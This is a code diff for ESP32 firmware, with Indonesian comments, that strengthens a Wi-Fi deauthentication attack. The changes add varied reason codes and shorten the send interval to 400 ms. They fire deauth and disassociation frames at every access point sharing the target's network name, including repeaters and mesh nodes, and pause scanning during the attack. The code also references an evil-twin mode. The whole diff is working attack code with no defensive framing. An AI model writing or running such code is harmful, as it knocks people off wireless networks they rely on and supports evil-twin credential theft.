@@ -168,7 +168,7 @@ void stopAll(){
 }
 
 // ---------------- deauth (ESP-IDF raw 802.11) -------------------------------
-void sendDeauth(uint8_t frameType, const uint8_t* bssid, uint8_t ch){
+void sendDeauth(uint8_t frameType, uint8_t reason, const uint8_t* bssid, uint8_t ch){
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   uint8_t frame[26] = {
     frameType, 0x00,        // frame control: 0xC0 deauth / 0xA0 disassoc
@@ -177,7 +177,7 @@ void sendDeauth(uint8_t frameType, const uint8_t* bssid, uint8_t ch){
     0, 0, 0, 0, 0, 0,       // source: diisi BSSID target
     0, 0, 0, 0, 0, 0,       // BSSID: target
     0x00, 0x00,             // sequence
-    0x07, 0x00              // reason: class 3 error
+    reason, 0x00            // reason code
   };
   memcpy(&frame[10], bssid, 6);
   memcpy(&frame[16], bssid, 6);
@@ -186,14 +186,25 @@ void sendDeauth(uint8_t frameType, const uint8_t* bssid, uint8_t ch){
 
 void deauthStep(){
   if(!deauthOn || targetIdx < 0) return;
-  if(millis() - lastDeauth < 1000) return;
+  if(millis() - lastDeauth < 400) return;
   lastDeauth = millis();
 
-  sendDeauth(0xC0, aps[targetIdx].bssid, aps[targetIdx].ch);   // deauth
-  sendDeauth(0xA0, aps[targetIdx].bssid, aps[targetIdx].ch);   // disassoc
-  sentFrames += 2;
+  // tembak semua BSSID dengan SSID sama (2.4/5 GHz, repeater, mesh)
+  uint8_t hit = 0;
+  for(int i = 0; i < (int)apCount && hit < 4; i++){
+    if(strcmp(aps[i].ssid, aps[targetIdx].ssid) != 0) continue;
+    if(aps[i].ch == 0) continue;
+    const uint8_t* b = aps[i].bssid;
+    uint8_t ch = aps[i].ch;
+    sendDeauth(0xC0, 7, b, ch);
+    sendDeauth(0xC0, 1, b, ch);
+    sendDeauth(0xA0, 7, b, ch);
+    sendDeauth(0xA0, 1, b, ch);
+    sendDeauth(0xC0, 2, b, ch);
+    hit++;
+  }
+  sentFrames += hit * 5;
 
-  // balik ke kanal AP kontrol supaya panel HP tidak ikut putus
   if(!twinOn) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
 }
 
@@ -509,6 +520,6 @@ void loop(){
   handleButtons();
   deauthStep();
 
-  if(millis() - lastScan >= 15000){ doScan(); }
+  if(millis() - lastScan >= 15000){ if(!deauthOn) doScan(); }
   delay(2);
 }
